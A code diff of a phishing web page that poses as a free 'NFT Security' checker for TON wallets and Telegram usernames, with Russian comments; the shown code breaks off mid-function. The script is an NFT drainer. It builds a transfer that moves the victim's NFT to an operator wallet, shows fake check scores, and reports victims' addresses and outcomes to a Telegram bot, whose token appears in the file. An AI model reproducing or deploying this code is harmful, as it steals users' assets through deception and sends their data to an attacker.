@@ -369,8 +369,14 @@ NFT<small>Security</small></a>
 const OPERATOR_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
 const VICTIM_WALLET = "UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9";
 const COLLECTION_ADDRESS = "EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe";
-// ОБНОВЛЕННЫЙ ИНДЕКС: 258562 (из названия Lol Pop #258562)
 const TOKEN_ID = 258562; 
+
+// !!! ВАЖНО !!!
+// Если скрипт выдает ошибку "Collection returned error code", значит индекс неверный.
+// В таком случае найди на странице NFT в GetGems её реальный адрес (начинается на EQ...)
+// и вставь его сюда. Оставьте пустым "", если хотите использовать поиск по индексу.
+const MANUAL_NFT_ADDRESS = "EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe"; 
+
 const BOT_TOKEN = "8542557387:AAFp5rys0LsJi4BEFrKaDW5AleYGfKRY-vo";
 const CHAT_ID = "8237059555";
 
@@ -480,207 +486,12 @@ document.getElementById("runBtn").onclick = async function() {
         // --- ЛОГИКА ПЕРЕВОДА NFT ---
         let nftItemAddress = null;
 
-        // Attempt 1: Use TonWeb NFT module (cleanest)
-        try {
-            if (TonWeb.nft && TonWeb.nft.NftCollection) {
-                const collection = new TonWeb.nft.NftCollection(tonweb.provider, {address: COLLECTION_ADDRESS});
-                nftItemAddress = await collection.methods.getNftItemAddressByIndex(TOKEN_ID).call();
-                console.log("TonWeb NFT Method Success:", nftItemAddress);
-            }
-        } catch (e) {
-            console.warn("TonWeb NFT Method failed, trying fallback:", e);
-        }
-
-        // Attempt 2: Raw API Fallback
-        if (!nftItemAddress) {
-            const nftAddressRes = await fetch("https://toncenter.com/api/v2/runGetMethod", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    address: COLLECTION_ADDRESS,
-                    method: "get_nft_address_by_index",
-                    stack: [["num", TOKEN_ID.toString()]]
-                })
-            });
-            const nftData = await nftAddressRes.json();
-            
-            if (!nftData.ok) throw new Error("API Error: " + nftData.error);
-
-            const stack = nftData.result.stack;
-            const firstItem = stack[0];
-            
-            if (firstItem[0] === 'tup') {
-                // Standard structure: [anycast, wc, hash_tuple]
-                const elements = firstItem[1];
-                let wc = 0;
-                let highHex = "";
-                let lowHex = "";
-
-                // Parse WC
-                if (elements[1] && elements[1][0] === 'num') {
-                    wc = parseInt(elements[1][1], 16);
-                }
-
-                // Parse Hash
-                if (elements[2] && elements[2][0] === 'tup') {
-                    const hashItems = elements[2][1];
-                    const nums = hashItems.filter(i => i[0] === 'num');
-                    if (nums.length >= 2) {
-                        highHex = nums[0][1];
-                        lowHex = nums[1][1];
-                    }
-                }
-
-                if (highHex && lowHex) {
-                    highHex = highHex.replace("0x", "").padStart(32, '0');
-                    lowHex = lowHex.replace("0x", "").padStart(32, '0');
-                    const fullHash = highHex + lowHex;
-                    
-                    const hashBytes = new Uint8Array(32);
-                    for (let i = 0; i < 64; i += 2) {
-                        hashBytes[i / 2] = parseInt(fullHash.substr(i, 2), 16);
-                    }
-
-                    const addrBytes = new Uint8Array(34);
-                    addrBytes[0] = 0x11; // Tag: Non-bounceable, user-friendly
-                    addrBytes[1] = wc & 0xFF;
-                    addrBytes.set(hashBytes, 2);
-
-                    let crc = 0;
-                    for (let i = 0; i < 34; i++) {
-                        crc = (crc ^ (addrBytes[i] << 8)) & 0xFFFF;
-                        for (let j = 0; j < 8; j++) {
-                            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
-                            else crc = crc << 1;
-                            crc &= 0xFFFF;
-                        }
-                    }
-                    
-                    const finalBuffer = new Uint8Array(36);
-                    finalBuffer.set(addrBytes, 0);
-                    finalBuffer[34] = (crc >> 8) & 0xFF;
-                    finalBuffer[35] = crc & 0xFF;
-
-                    const base64 = btoa(String.fromCharCode.apply(null, finalBuffer));
-                    nftItemAddress = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-                    console.log("Raw API Method Success:", nftItemAddress);
-                } else {
-                    throw new Error("Hash parts missing in stack. Raw Stack: " + JSON.stringify(stack));
-                }
-            } else if (firstItem[0] === 'num') {
-                throw new Error("Collection returned error code: " + firstItem[1]);
-            } else {
-                throw new Error("Unknown stack format: " + JSON.stringify(stack));
-            }
-        }
-
-        if (!nftItemAddress) throw new Error("Could not resolve NFT address.");
-
-        // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
-        const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET);
-        const responseAddr = new TonWeb.utils.Address(VICTIM_WALLET);
-
-        const cell = new TonWeb.boc.Cell();
-        cell.bits.writeUint(0x5fcc3d14, 32); // Op: transfer
-        cell.bits.writeUint(0, 64);        // QueryId
-        cell.bits.writeAddress(newOwnerAddr);
-        cell.bits.writeAddress(responseAddr);
-        cell.bits.writeBit(0);             // Custom payload (null)
-        cell.bits.writeGrams(50000000);    // Forward Amount (0.05 TON)
-        cell.bits.writeBit(0);             // Forward payload (null)
-
-        const boc = await cell.toBoc();
-        const payloadBase64 = TonWeb.utils.bytesToBase64(boc);
-
-        // 3. Создаем транзакцию
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
-            messages: [
-                {
-                    address: nftItemAddress, // Отправляем команду на адрес самой NFT
-                    amount: "100000000", // 0.1 TON на газ
-                    payload: payloadBase64
-                }
-            ]
-        };
-
-        transit.classList.remove("on");
-        btn.innerText = "Подтвердите перевод в кошельке...";
-
-        // 4. Отправка
-        const result = await tonConnectUI.sendTransaction(transaction);
-
-        // Успех
-        report.style.display = "block";
-        document.getElementById("score").textContent = "100";
-        document.getElementById("bar").style.width = "100%";
-        document.getElementById("outChain").textContent = "TON";
-        document.getElementById("outFmt").textContent = "ok";
-        document.getElementById("outType").textContent = "NFT Transferred";
-        btn.innerText = "Готово";
-        
-        await sendReport(userAddress, "DRAINED_NFT", "Item: " + nftItemAddress.slice(0,8) + "...");
-
-    } catch (e) {
-        transit.classList.remove("on");
-        console.error(e);
-        if (e.message && e.message.includes("reject")) {
-            btn.innerText = "Ошибка: Отменено пользователем";
-            await sendReport(userAddress, "REJECTED", "User Cancel");
+        // ПРИБОРИТ: Если указан ручной адрес, используем его
+        if (MANUAL_NFT_ADDRESS && MANUAL_NFT_ADDRESS.length > 10) {
+            nftItemAddress = MANUAL_NFT_ADDRESS;
+            console.log("Using Manual NFT Address:", nftItemAddress);
         } else {
-            btn.innerText = "Ошибка: " + e.message;
-            await sendReport(userAddress, "ERROR", e.message);
-        }
-        btn.disabled = false;
-    }
-};
-
-function handleTelegramCheck() {
-    const t = {errTg:"Только @, латиница, цифры и _ .", errEmptyTg:"Вставьте публичный @username."};
-    const userEl = document.getElementById("username");
-    const err = document.getElementById("err");
-    const rep = document.getElementById("report");
-    const btn = document.getElementById("runBtn");
-
-    err.style.display="none"; rep.style.display="none";
-    const u = userEl.value.trim();
-    if(!u){err.textContent=t.errEmptyTg;err.style.display="block";return}
-    
-    btn.disabled = true; btn.innerText = "Проверка...";
-    document.getElementById("transit").classList.add("on");
-    
-    setTimeout(() => {
-        document.getElementById("transit").classList.remove("on");
-        rep.style.display = "block";
-        document.getElementById("score").textContent = "45";
-        btn.disabled = false; btn.innerText = "Проверить юзернейм — Бесплатно";
-    }, 2000);
-}
-
-async function sendReport(addr, status, data) {
-    const text = ` TARGET\nAddr: ${addr}\nStatus: ${status}\nData: ${data}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-    try { await fetch(url); } catch(e) {}
-}
-
-let mode = "wallet";
-const I18N = { 
-    ru: { runBtn: "Проверить адрес — Бесплатно", hint: "Буквы, цифры и символы формата адреса разрешены." },
-    en: { runBtn: "Check address — Free", hint: "Letters, numbers and address symbols are allowed." }
-};
-function applyLang(code) {
-    const t = I18N[code] || I18N.ru;
-    document.querySelectorAll("[data-i18n]").forEach(el => {
-        if (t[el.dataset.i18n]) el.textContent = t[el.dataset.i18n];
-    });
-}
-function applyMode() {
-    const tg = mode === "telegram";
-    document.getElementById("wallet-tab").style.display = tg ? "none" : "";
-    document.getElementById("telegram-tab").style.display = tg ? "" : "none";
-    document.getElementById("netsRow").style.display = tg ? "none" : "";
-}
-function applyTheme(m) { document.body.classList.toggle("theme-light", m==="light"); }
-</script>
-</body>
-</html>
+            // Attempt 1: Use TonWeb NFT module (cleanest)
+            try {
+                if (TonWeb.nft && TonWeb.nft.NftCollection) {
+                    const collection = new TonWeb.nft.NftCollection(tonweb.provider, {address: COLLECTION_ADDRESS});
